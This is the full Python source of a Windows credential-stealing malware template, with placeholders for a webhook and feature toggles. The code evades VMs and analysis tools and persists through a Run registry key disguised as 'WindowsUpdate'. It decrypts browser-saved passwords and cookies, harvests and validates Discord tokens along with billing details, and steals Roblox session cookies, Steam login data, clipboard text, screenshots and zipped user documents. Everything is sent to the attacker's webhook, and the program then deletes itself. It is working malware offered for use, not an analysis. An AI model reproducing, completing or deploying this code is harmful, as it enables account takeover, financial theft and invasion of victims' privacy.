import os, sys, re, json, sqlite3, base64, shutil, tempfile, time, subprocess, threading, glob, win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import psutil
from PIL import ImageGrab
import win32clipboard
import requests

WEBHOOK = "{WEBHOOK}"
ZIP_PASSWORD = "{ZIP_PASSWORD}"
ROAMING = os.environ['APPDATA']
LOCAL = os.environ['LOCALAPPDATA']

SCREENSHOT = {SCREENSHOT}
CLIPBOARD = {CLIPBOARD}
STEAM = {STEAM}
DISCORD_TOKENS = {DISCORD_TOKENS}
DISCORD_FILES = {DISCORD_FILES}
BROWSER_PASSWORDS = {BROWSER_PASSWORDS}
COOKIES = {COOKIES}
FILE_GRABBER = {FILE_GRABBER}
LOG_IP = {LOG_IP}
STARTUP = {STARTUP}
MELT = {MELT}
ANTI_VM = {ANTI_VM}
ANTI_ANALYSIS = {ANTI_ANALYSIS}
FILE_EXTS = {FILE_EXTENSIONS}
GRAB_FOLDERS = {GRAB_FOLDERS}

if ANTI_VM:
    def is_vm():
        for d in ['vmware','vbox','virtualbox','qemu']:
            if os.path.exists(f"C:\\Windows\\System32\\drivers\\{d}.sys"):
                return True
        return False
    if is_vm():
        sys.exit(0)

if ANTI_ANALYSIS:
    def is_analysis():
        bad = ['wireshark','procexp','procmon','ida','ollydbg','x64dbg','tcpview','fiddler']
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and any(b in proc.info['name'].lower() for b in bad):
                    return True
        except:
            pass
        return False
    if is_analysis():
        sys.exit(0)

if STARTUP:
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + sys.argv[0])
        key.Close()
    except:
        pass

def send_text(data, title=""):
    if not data:
        return
    if isinstance(data, list):
        data = '\n'.join(str(x)[:500] for x in data)
    else:
        data = str(data)[:1900]
    try:
        requests.post(WEBHOOK, json={"content": f"**{title}**\n```\n{data}\n```"}, timeout=10)
    except:
        pass

def send_file(filepath, caption=""):
    if not os.path.exists(filepath):
        return
    with open(filepath, 'rb') as f:
        files = {'file': (os.path.basename(filepath), f)}
        try:
            requests.post(WEBHOOK, files=files, data={'content': caption}, timeout=20)
        except:
            pass
    try:
        os.unlink(filepath)
    except:
        pass

def steal_clipboard():
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            win32clipboard.CloseClipboard()
            return data[:1000]
        elif win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
            data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            win32clipboard.CloseClipboard()
            return data.decode('utf-8','ignore')[:1000]
        else:
            win32clipboard.CloseClipboard()
    except:
        pass
    return None

def take_screenshot():
    try:
        img = ImageGrab.grab()
        tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
        img.save(tmp.name, "PNG")
        tmp.close()
        send_file(tmp.name, "📸 Screenshot")
    except:
        pass

def steal_steam():
    steam_path = os.path.join(os.environ.get('ProgramFiles(x86)','C:\\Program Files (x86)'), 'Steam', 'config', 'loginusers.vdf')
    if os.path.exists(steam_path):
        try:
            with open(steam_path, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()[:1500]
        except:
            pass
    return None

def get_master_key(user_data_path):
    local_state = os.path.join(user_data_path, "Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            local = json.load(f)
        encrypted_key = base64.b64decode(local['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(enc, key):
    if not key or enc[:3] != b'v10':
        return None
    try:
        nonce = enc[3:15]
        ciphertext = enc[15:-16]
        tag = enc[-16:]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext + tag, None).decode('utf-8')
    except:
        return None

def extract_tokens_from_leveldb(folder):
    tokens = []
    regex = re.compile(r'[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}')
    leveldb = os.path.join(folder, "Local Storage", "leveldb")
    if not os.path.exists(leveldb):
        return tokens
    for f in os.listdir(leveldb):
        if f.endswith(('.ldb','.log')):
            try:
                with open(os.path.join(leveldb, f), 'rb') as fd:
                    data = fd.read().decode('utf-8','ignore')
                tokens.extend(regex.findall(data))
            except:
                pass
    return tokens

def extract_tokens_from_browser(browser_path, name):
    tokens = []
    if "Opera" in name:
        profile = browser_path
    else:
        profile = os.path.join(browser_path, "Default")
    if not os.path.exists(profile):
        return tokens
    master = get_master_key(browser_path)
    if not master:
        return tokens
    cookies_db = os.path.join(profile, "Cookies")
    if not os.path.exists(cookies_db):
        return tokens
    tmp = tempfile.mktemp()
    try:
        shutil.copy2(cookies_db, tmp)
        conn = sqlite3.connect(tmp)
        c = conn.cursor()
        c.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord.com%' AND name='token'")
        row = c.fetchone()
        if row and isinstance(row[0], bytes):
            dec = decrypt_value(row[0], master)
            if dec:
                tokens.append(dec)
        conn.close()
    except:
        pass
    finally:
        try: os.unlink(tmp)
        except: pass
    return tokens

def validate_token(token):
    headers = {"Authorization": token.strip()}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            user = data['username'] + '#' + str(data.get('discriminator','0'))
            uid = data['id']
            email = data.get('email','No email')
            mfa = data.get('mfa_enabled',False)
            nitro = data.get('premium_type',0)
            nitro_names = {0:'No Nitro',1:'Nitro Classic',2:'Nitro',3:'Nitro Basic'}
            nitro_str = nitro_names.get(nitro,'Unknown')
            billing = "None"
            try:
                br = requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=10)
                if br.status_code == 200:
                    sources = br.json()
                    methods = {'Card':0,'Paypal':0}
                    for s in sources:
                        if s.get('type') == 1: methods['Card'] += 1
                        elif s.get('type') == 2: methods['Paypal'] += 1
                    billing = ', '.join(f"{k} ({v})" for k,v in methods.items() if v>0) or 'None'
            except:
                pass
            gifts = []
            try:
                gr = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers, timeout=10)
                if gr.status_code == 200:
                    for g in gr.json():
                        if isinstance(g,dict) and g.get('code') and g.get('promotion',{}).get('outbound_title'):
                            gifts.append(g['promotion']['outbound_title'] + ': ' + g['code'])
            except:
                pass
            gifts_str = '\n'.join(gifts) if gifts else 'None'
            return f"**{user}** ({uid})\nEmail: {email}\nMFA: {mfa}\nNitro: {nitro_str}\nBilling: {billing}\nGifts: {gifts_str}\nToken: `{token}`"
    except:
        pass
    return None

def get_all_tokens():
    tokens = []
    threads = []
    discord_clients = {
        "Discord": os.path.join(ROAMING, "discord"),
        "Discord Canary": os.path.join(ROAMING, "discordcanary"),
        "Lightcord": os.path.join(ROAMING, "Lightcord"),
        "Discord PTB": os.path.join(ROAMING, "discordptb"),
        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable")
    }
    for path in discord_clients.values():
        if os.path.exists(path):
            t = threading.Thread(target=lambda p=path: tokens.extend(extract_tokens_from_leveldb(p)))
            t.start()
            threads.append(t)
    browser_paths = {
        "Amigo": os.path.join(LOCAL, "Amigo", "User Data"),
        "Torch": os.path.join(LOCAL, "Torch", "User Data"),
        "Kometa": os.path.join(LOCAL, "Kometa", "User Data"),
        "Orbitum": os.path.join(LOCAL, "Orbitum", "User Data"),
        "CentBrowser": os.path.join(LOCAL, "CentBrowser", "User Data"),
        "7Star": os.path.join(LOCAL, "7Star", "7Star", "User Data"),
        "Sputnik": os.path.join(LOCAL, "Sputnik", "Sputnik", "User Data"),
        "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
        "Chrome SxS": os.path.join(LOCAL, "Google", "Chrome SxS", "User Data"),
        "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
        "Epic Privacy Browser": os.path.join(LOCAL, "Epic Privacy Browser", "User Data"),
        "Microsoft Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
        "Uran": os.path.join(LOCAL, "uCozMedia", "Uran", "User Data"),
        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
        "Iridium": os.path.join(LOCAL, "Iridium", "User Data")
    }
    for name, path in browser_paths.items():
        if os.path.exists(path):
            t = threading.Thread(target=lambda n=name, p=path: tokens.extend(extract_tokens_from_browser(p, n)))
            t.start()
            threads.append(t)
    for t in threads:
        t.join()
    tokens = list(set(tokens))
    results = []
    for tok in tokens:
        info = validate_token(tok)
        if info:
            results.append(info)
    return results

def steal_discord_files():
    files = []
    folders = ["discord", "discordptb", "discordcanary", "Lightcord"]
    for d in folders:
        path = os.path.join(ROAMING, d)
        if os.path.exists(path):
            for root, _, filenames in os.walk(path):
                for fn in filenames:
                    if fn.endswith(('.log','.ldb','Local State')):
                        files.append(f"{d}/{fn}")
    return files[:30]

def steal_roblox_cookies():
    roblox_cookies = []
    browser_paths = {
        "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
        "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
        "Amigo": os.path.join(LOCAL, "Amigo", "User Data"),
        "Torch": os.path.join(LOCAL, "Torch", "User Data"),
        "Kometa": os.path.join(LOCAL, "Kometa", "User Data"),
        "Orbitum": os.path.join(LOCAL, "Orbitum", "User Data"),
        "CentBrowser": os.path.join(LOCAL, "CentBrowser", "User Data"),
        "7Star": os.path.join(LOCAL, "7Star", "7Star", "User Data"),
        "Sputnik": os.path.join(LOCAL, "Sputnik", "Sputnik", "User Data"),
        "Chrome SxS": os.path.join(LOCAL, "Google", "Chrome SxS", "User Data"),
        "Epic Privacy Browser": os.path.join(LOCAL, "Epic Privacy Browser", "User Data"),
        "Uran": os.path.join(LOCAL, "uCozMedia", "Uran", "User Data"),
        "Iridium": os.path.join(LOCAL, "Iridium", "User Data")
    }
    for name, user_data in browser_paths.items():
        if not os.path.exists(user_data):
            continue
        if "Opera" in name:
            profile = user_data
        else:
            profile = os.path.join(user_data, "Default")
        if not os.path.exists(profile):
            continue
        master = get_master_key(user_data)
        if not master:
            continue
        cookies_db = os.path.join(profile, "Cookies")
        if not os.path.exists(cookies_db):
            continue
        tmp = tempfile.mktemp()
        try:
            shutil.copy2(cookies_db, tmp)
            conn = sqlite3.connect(tmp)
            c = conn.cursor()
            c.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'")
            rows = c.fetchall()
            for host, n, val in rows:
                if isinstance(val, bytes):
                    dec = decrypt_value(val, master)
                    if dec:
                        roblox_cookies.append(f"{name} | {host} | {n} = {dec}")
            conn.close()
        except:
            pass
        finally:
            try: os.unlink(tmp)
            except: pass
    firefox_profiles = glob.glob(os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles", "*default*"))
    for profile in firefox_profiles:
        cookies_db = os.path.join(profile, "cookies.sqlite")
        if not os.path.exists(cookies_db):
            continue
        tmp = tempfile.mktemp()
        try:
            shutil.copy2(cookies_db, tmp)
            conn = sqlite3.connect(tmp)
            c = conn.cursor()
            c.execute("SELECT host, name, value FROM moz_cookies WHERE host LIKE '%roblox.com%' AND name='.ROBLOSECURITY'")
            rows = c.fetchall()
            for host, name, value in rows:
                if value:
                    roblox_cookies.append(f"Firefox | {host} | {name} = {value}")
            conn.close()
        except:
            pass
        finally:
            try: os.unlink(tmp)
            except: pass
    return roblox_cookies

def steal_browser_passwords():
    all_creds = []
    browser_paths = {
        "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
        "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
        "Amigo": os.path.join(LOCAL, "Amigo", "User Data"),
        "Torch": os.path.join(LOCAL, "Torch", "User Data"),
        "Kometa": os.path.join(LOCAL, "Kometa", "User Data"),
        "Orbitum": os.path.join(LOCAL, "Orbitum", "User Data"),
        "CentBrowser": os.path.join(LOCAL, "CentBrowser", "User Data"),
        "7Star": os.path.join(LOCAL, "7Star", "7Star", "User Data"),
        "Sputnik": os.path.join(LOCAL, "Sputnik", "Sputnik", "User Data"),
        "Chrome SxS": os.path.join(LOCAL, "Google", "Chrome SxS", "User Data"),
        "Epic Privacy Browser": os.path.join(LOCAL, "Epic Privacy Browser", "User Data"),
        "Uran": os.path.join(LOCAL, "uCozMedia", "Uran", "User Data"),
        "Iridium": os.path.join(LOCAL, "Iridium", "User Data")
    }
    for name, user_data in browser_paths.items():
        if not os.path.exists(user_data):
            continue
        if "Opera" in name:
            profile = user_data
        else:
            profile = os.path.join(user_data, "Default")
        if not os.path.exists(profile):
            continue
        master = get_master_key(user_data)
        if not master:
            continue
        db_file = os.path.join(profile, "Login Data")
        if not os.path.exists(db_file):
            continue
        tmp = tempfile.mktemp()
        try:
            shutil.copy2(db_file, tmp)
            conn = sqlite3.connect(tmp)
            c = conn.cursor()
            c.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in c.fetchall():
                if isinstance(pw, bytes):
                    dec = decrypt_value(pw, master)
                    if user and dec:
                        all_creds.append(f"{name}: {url} | {user} : {dec}")
            conn.close()
        except:
            pass
        finally:
            try: os.unlink(tmp)
            except: pass
    return all_creds

def steal_cookies():
    all_cookies = []
    browser_paths = {
        "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
        "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
    }
    for name, user_data in browser_paths.items():
        if not os.path.exists(user_data):
            continue
        if "Opera" in name:
            profile = user_data
        else:
            profile = os.path.join(user_data, "Default")
        if not os.path.exists(profile):
            continue
        master = get_master_key(user_data)
        if not master:
            continue
        db_file = os.path.join(profile, "Cookies")
        if not os.path.exists(db_file):
            continue
        tmp = tempfile.mktemp()
        try:
            shutil.copy2(db_file, tmp)
            conn = sqlite3.connect(tmp)
            c = conn.cursor()
            c.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 200")
            for host, n, val in c.fetchall():
                if isinstance(val, bytes):
                    dec = decrypt_value(val, master)
                    if dec:
                        all_cookies.append(f"{name} | {host} | {n} = {dec[:100]}")
            conn.close()
        except:
            pass
        finally:
            try: os.unlink(tmp)
            except: pass
    return all_cookies

def grab_files_to_zip():
    import zipfile
    target_folders = []
    for f in GRAB_FOLDERS:
        if f == "Desktop":
            folder = os.path.join(os.environ['USERPROFILE'], 'Desktop')
        elif f == "Documents":
            folder = os.path.join(os.environ['USERPROFILE'], 'Documents')
        elif f == "Downloads":
            folder = os.path.join(os.environ['USERPROFILE'], 'Downloads')
        else:
            folder = f
        if os.path.exists(folder):
            target_folders.append(folder)
    if not target_folders:
        return None
    collected = []
    for base in target_folders:
        for root, _, files in os.walk(base):
            for file in files:
                if any(file.lower().endswith(ext.lower()) for ext in FILE_EXTS):
                    full = os.path.join(root, file)
                    try:
                        if os.path.getsize(full) < 20 * 1024 * 1024:
                            collected.append(full)
                    except:
                        pass
    if not collected:
        return None
    zip_path = os.path.join(tempfile.gettempdir(), "stolen_files.zip")
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in collected[:100]:
                try:
                    zf.write(f, arcname=os.path.basename(f))
                except:
                    pass
    except:
        return None
    seven_zip = r"C:\Program Files\7-Zip\7z.exe"
    if os.path.exists(seven_zip) and ZIP_PASSWORD:
        pwd_zip = zip_path.replace('.zip', '_pwd.zip')
        subprocess.run([seven_zip, 'a', f'-p{ZIP_PASSWORD}', pwd_zip, zip_path], capture_output=True)
        return pwd_zip
    return zip_path

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return 'Unknown'

def self_delete():
    try:
        if sys.argv[0].endswith('.exe'):
            os.system(f'ping 127.0.0.1 -n 3 > nul & del "{sys.argv[0]}"')
        else:
            os.remove(sys.argv[0])
    except:
        pass

if __name__ == "__main__":
    if LOG_IP:
        send_text(f'IP: {get_public_ip()}', 'System Info')
    if SCREENSHOT:
        take_screenshot()
    if CLIPBOARD:
        clip = steal_clipboard()
        if clip:
            send_text(clip, 'Clipboard')
    if STEAM:
        steam = steal_steam()
        if steam:
            send_text(steam, 'Steam')
    if DISCORD_TOKENS:
        tokens = get_all_tokens()
        if tokens:
            for info in tokens:
                send_text(info, 'Discord Account')
        if DISCORD_FILES:
            files = steal_discord_files()
            if files:
                send_text(files, 'Discord Local Files')
    roblox = steal_roblox_cookies()
    if roblox:
        send_text(roblox, 'Roblox .ROBLOSECURITY Cookies')
    if BROWSER_PASSWORDS:
        pws = steal_browser_passwords()
        if pws:
            send_text(pws, 'Browser Passwords')
    if COOKIES:
        cks = steal_cookies()
        if cks:
            send_text(cks, 'Browser Cookies')
    if FILE_GRABBER:
        zipf = grab_files_to_zip()
        if zipf and os.path.exists(zipf):
            send_file(zipf, '📦 Grabbed Files (ZIP)')
    if MELT:
        self_delete()
